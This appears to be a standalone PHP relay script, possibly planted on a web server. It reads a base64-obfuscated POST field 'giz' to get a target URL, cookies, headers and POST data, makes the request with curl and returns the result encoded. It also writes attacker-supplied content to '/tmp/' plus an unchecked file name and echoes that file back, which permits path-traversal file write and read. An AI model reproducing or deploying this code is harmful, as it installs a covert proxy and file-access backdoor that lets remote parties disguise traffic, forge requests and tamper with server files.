<?php
function curl_download(){
  global $b;
  $baslik = array();
  file_put_contents('/tmp/'.$b["cerezDosyaAdi"], $b["cerez"]);
  if (!function_exists('curl_init')) die('Sorry something wrong!');
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $b["siteAdresi"]);
  curl_setopt($ch, CURLOPT_REFERER, $b["siteReferer"]);
  curl_setopt($ch, CURLOPT_USERAGENT, $b["userAgent"]);
  curl_setopt($ch, CURLOPT_HEADER, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_TIMEOUT, 15);
  if($b["postMethod"] == "1"){
    curl_setopt($ch, CURLOPT_POST, TRUE);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $b["postVeri"]);
    $baslik[] = 'Content-Length: ' . strlen($b["postVeri"]);
  }
  if($b["ContentType"] != "0"){
    $baslik[] = 'Content-Type: ' . $b["ContentType"]; 
  }
  if($b["XRequestedWith"] != "0"){
    $baslik[] = 'X-Requested-With: ' . $b["XRequestedWith"];
  }
  if(count($baslik) > 0){
    curl_setopt($ch, CURLOPT_HTTPHEADER, $baslik); 
  }
  curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/'.$b["cerezDosyaAdi"]);
  curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/'.$b["cerezDosyaAdi"]);
  $output = curl_exec($ch);
  curl_close($ch);
  return $output;
}


if(isset($_POST['giz'])) {
  $acilmis = base64_decode($_POST['giz']);
  $acilmis = str_replace("%3D", "=", $acilmis);
  $acilmis = str_replace("%2B", "+", $acilmis);
  $acilmis = str_replace("%2F", "/", $acilmis);
  $a = explode('&', $acilmis);

  for($i=0; $i<count($a); $i++) {
    if(substr($a[$i],0,10) == "userAgent=") { $b["userAgent"] = base64_decode(substr($a[$i],10));}
    else if(substr($a[$i],0,6) == "cerez=") { $b["cerez"] = base64_decode(substr($a[$i],6));}
    else if(substr($a[$i],0,11) == "siteAdresi=") { $b["siteAdresi"] = base64_decode(substr($a[$i],11));}
    else if(substr($a[$i],0,9) == "postVeri=") { $b["postVeri"] = base64_decode(substr($a[$i],9));}
    else if(substr($a[$i],0,11) == "postMethod=") { $b["postMethod"] = base64_decode(substr($a[$i],11));}
    else if(substr($a[$i],0,12) == "siteReferer=") { $b["siteReferer"] = base64_decode(substr($a[$i],12));}
    else if(substr($a[$i],0,14) == "cerezDosyaAdi=") { $b["cerezDosyaAdi"] = base64_decode(substr($a[$i],14));}
    else if(substr($a[$i],0,12) == "ContentType=") { $b["ContentType"] = base64_decode(substr($a[$i],12));}
    else if(substr($a[$i],0,15) == "XRequestedWith=") { $b["XRequestedWith"] = base64_decode(substr($a[$i],15));}
  }
  //print_r($b);
  $sonuc = base64_encode(curl_download());
  print base64_encode(file_get_contents('/tmp/'.$b["cerezDosyaAdi"]));
  print "<br><br>";
  print $sonuc;
}
?>
